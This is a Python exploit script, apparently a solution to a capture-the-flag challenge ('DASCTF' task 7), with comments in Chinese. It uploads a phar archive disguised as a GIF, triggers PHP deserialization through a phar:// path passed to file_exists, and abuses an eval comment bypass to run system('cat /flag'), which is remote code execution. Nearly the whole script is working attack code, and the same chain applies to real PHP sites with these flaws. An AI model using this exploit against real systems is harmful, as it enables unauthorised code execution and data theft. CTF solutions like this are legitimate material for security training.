#!/usr/bin/env python3
"""
DASCTF 第七题解题脚本
Phar 反序列化 + 文件上传 + eval # 注释绕过

利用链:
1. 构造含 Evil 对象的 phar 文件 (GIF89a 头绕过上传检查)
2. 上传 phar 文件, 获取保存路径 (upload/md5(filename).ext)
3. 通过 file_exists('phar://path') 触发反序列化
4. Evil::__destruct() → eval("#\rsystem('cat /flag');") → RCE

用法:
  1. 先用 PHP 生成 phar 文件:
     php -d phar.readonly=0 -r '...' (见 gen_phar.php)
  2. python3 solve.py
"""
import requests
import re
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://TARGET/"
PHAR_FILE = sys.argv[2] if len(sys.argv) > 2 else "evil.phar"


def upload_phar(target, phar_path):
    """上传 phar 文件, 返回服务器保存路径"""
    with open(phar_path, 'rb') as f:
        content = f.read()
    
    resp = requests.post(
        f"{target}/index.php",
        files={"file": ("evil.gif", content, "image/gif")},
        timeout=10
    )
    
    saved_match = re.search(r'Saved to:\s*(.+?)\s*<', resp.text)
    if saved_match:
        return saved_match.group(1).strip()
    
    # 如果没有 "Saved to:", 检查是否上传失败
    if len(resp.text) <= 1420:
        print("[-] 上传失败: 文件可能缺少 GIF89a 头")
    return None


def trigger_phar(target, saved_path):
    """通过 phar:// 触发反序列化"""
    phar_url = f"phar://{saved_path}/test.txt"
    resp = requests.get(
        f"{target}/class.php",
        params={"file": phar_url},
        timeout=10
    )
    return resp


def main():
    print(f"[*] 目标: {TARGET}")
    print(f"[*] Phar 文件: {PHAR_FILE}")
    
    # Step 1: 上传
    print("\n[1] 上传 phar 文件...")
    saved_path = upload_phar(TARGET, PHAR_FILE)
    if not saved_path:
        print("[-] 上传失败!")
        return
    print(f"[+] 保存路径: {saved_path}")
    
    # Step 2: 触发
    print("\n[2] 触发 phar 反序列化...")
    resp = trigger_phar(TARGET, saved_path)
    
    # Step 3: 获取 flag
    flag = re.search(r'CTF2\{[^}]+\}', resp.text)
    if flag:
        print(f"\n[+] FLAG: {flag.group(0)}")
    elif 'No!' in resp.text:
        print("[-] Evil 触发但 payload 被正则过滤 (No!)")
    else:
        print(f"[*] 响应长度: {len(resp.text)} (基线: 2361)")
        print(f"[*] 完整响应:\n{resp.text}")


if __name__ == '__main__':
    main()
